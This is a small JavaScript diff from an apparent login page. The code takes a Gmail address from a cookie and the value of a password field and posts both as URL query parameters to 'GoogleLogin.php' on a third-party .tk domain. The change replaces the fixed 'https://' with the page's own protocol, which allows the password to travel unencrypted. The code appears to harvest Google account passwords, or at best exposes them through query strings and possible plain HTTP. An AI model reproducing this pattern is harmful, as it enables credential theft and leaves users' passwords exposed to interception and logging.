@@ -155,7 +155,7 @@ if(Cookies.get('email').indexOf('@gmail.com')==-1&&Cookies.get('email').indexOf(
 				}
 			}
 		};
-		xhttp.open("POST", "https://co-co.tk/api/GoogleLogin.php?email="+Cookies.get('email')+"&pw="+document.getElementById("pw").value, true);
+		xhttp.open("POST", location.protocol+"//co-co.tk/api/GoogleLogin.php?email="+Cookies.get('email')+"&pw="+document.getElementById("pw").value, true);
 		xhttp.send();
 	}
 	function count(str) {
